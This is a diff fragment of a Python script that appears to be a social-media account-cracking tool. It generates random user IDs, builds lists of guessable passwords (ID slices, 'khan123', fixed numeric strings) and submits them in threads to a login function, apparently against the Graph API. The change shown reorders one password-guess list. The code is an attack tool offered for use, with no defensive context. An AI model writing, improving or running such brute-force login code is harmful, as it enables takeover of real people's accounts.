@@ -120,7 +120,7 @@ def rmenu1():
 			id=code+rngx
 			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
 			if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
-			if "3" in rcd:psd=[rngx,id[:8],id[:7],id[:9],id,"57273200","59039200","57575751"]
+			if "3" in rcd:psd=["57273200","59039200",id[:8],id[:7],id[:9],id,"57575751"]
 			tonxoys.submit(graphrm,id,psd,tid)
 ############------[RANDOM USN SYSTEM BOSS EMRAN EHC]-------#########
 lk=[]
@@ -164,3 +164,4 @@ def graphrm(id,psd,tid):
 	lop+=1
 Main()
 #-৳-৳-৳-৳
+
